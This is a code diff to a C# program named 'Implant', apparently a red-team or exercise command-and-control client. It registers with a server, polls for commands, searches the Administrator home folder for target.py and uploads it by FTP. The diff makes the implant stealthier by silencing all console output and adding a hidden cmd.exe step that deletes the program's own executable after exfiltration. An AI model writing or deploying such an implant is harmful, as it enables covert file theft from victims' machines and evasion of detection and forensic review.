@@ -8,6 +8,8 @@ using System.Linq;
 using System.Text;
 using System.Diagnostics;
 using System.Reflection;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 
 namespace Implant
@@ -38,19 +40,16 @@ namespace Implant
             {
               using (Stream requestStream = request.GetRequestStream())
               {
-
                 fs.CopyTo(requestStream);
-                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
-                {
-                  Console.WriteLine("DEBUG: Upload Complete, status {response.StatusDescription}");
-                }
+                KillMsg();
+                Kill();
               }
             }
 
           }
           catch (Exception ex)
           {
-             Console.WriteLine(ex.Message.ToString());
+             // Console.WriteLine(ex.Message.ToString());
           }
 
 
@@ -104,12 +103,12 @@ namespace Implant
           var response = (HttpWebResponse)client.GetResponse();
           cmd = response.GetResponseHeader("cmd");
           string responseText;
-          Console.WriteLine("Registration sent, response:");
+          // Console.WriteLine("Registration sent, response:");
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          Console.WriteLine(responseText);
+          // Console.WriteLine(responseText);
           return;
         }
 
@@ -130,13 +129,13 @@ namespace Implant
             stream.Write(data, 0, data.Length);
           }
           var response = (HttpWebResponse)client.GetResponse();
-          Console.WriteLine("Exfil message sent, response: ");
+          // Console.WriteLine("Exfil message sent, response: ");
           string responseText;
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          Console.WriteLine(responseText);
+          // Console.WriteLine(responseText);
 
           cmd = response.GetResponseHeader("cmd");
           if(Found == 1) {
@@ -165,13 +164,13 @@ namespace Implant
           }
           var response = (HttpWebResponse)client.GetResponse();
           cmd = response.GetResponseHeader("cmd");
-          Console.WriteLine("Heartbeat sent, response: ");
+          // Console.WriteLine("Heartbeat sent, response: ");
           string responseText;
           using (StreamReader sr = new StreamReader(response.GetResponseStream()))
           {
             responseText = sr.ReadToEnd();
           }
-          Console.WriteLine(responseText);
+          // Console.WriteLine(responseText);
 
           return;
         }
@@ -192,7 +191,7 @@ namespace Implant
             stream.Write(data, 0, data.Length);
           }
           client.GetResponse();
-          Console.WriteLine("Kill acknowledgement sent.");
+          // Console.WriteLine("Kill acknowledgement sent.");
           return;
         }
 
@@ -200,13 +199,14 @@ namespace Implant
         // Starts a command line (async) to delete the file after five seconds, then kills the process
         static void Kill()
         {
-          Process proc = new Process();
-          proc.StartInfo.FileName = "cmd.exe";
-          proc.StartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 5000 > Nul & Del " +
-            (string)Assembly.GetEntryAssembly().Location;
-          proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-          Console.WriteLine("Killing.");
-          proc.Start();
+          // Console.WriteLine("Killing.");
+          Process.Start( new ProcessStartInfo()
+          {
+              Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
+              WindowStyle = ProcessWindowStyle.Hidden, 
+              CreateNoWindow = true, 
+              FileName = "cmd.exe"
+          });
 
 
           Environment.Exit(0);
@@ -215,17 +215,17 @@ namespace Implant
         // Search the entire home directory for a file called target.py, then Exfil
         static void FileSearch()
         {
-          Console.WriteLine("Searching...");
+          // Console.WriteLine("Searching...");
           string[] filelist = Directory.GetFiles(@"C:\Documents and Settings\Administrator", "*target.py", SearchOption.AllDirectories);
           if(filelist.Length == 0)
           {
-            Console.WriteLine("File not found.");
+            // Console.WriteLine("File not found.");
             Exfil(0, "");
 
           }
           else
           {
-            Console.WriteLine("File found at " + filelist[0]);
+            // Console.WriteLine("File found at " + filelist[0]);
             Exfil(1, filelist[0]);
           }
           return;
@@ -233,12 +233,13 @@ namespace Implant
 
         static void Main(string[] args)
         {
+
           // Console.WriteLine("DEBUG: IP - " + (string)GetIP());
-          Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());
+          // Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());
 
           Register(); // will hang if server ip not valid
           while (true) {
-            Console.WriteLine(cmd);
+            // Console.WriteLine(cmd);
             switch(cmd) {
               case "0":
                 System.Threading.Thread.Sleep(timeout);
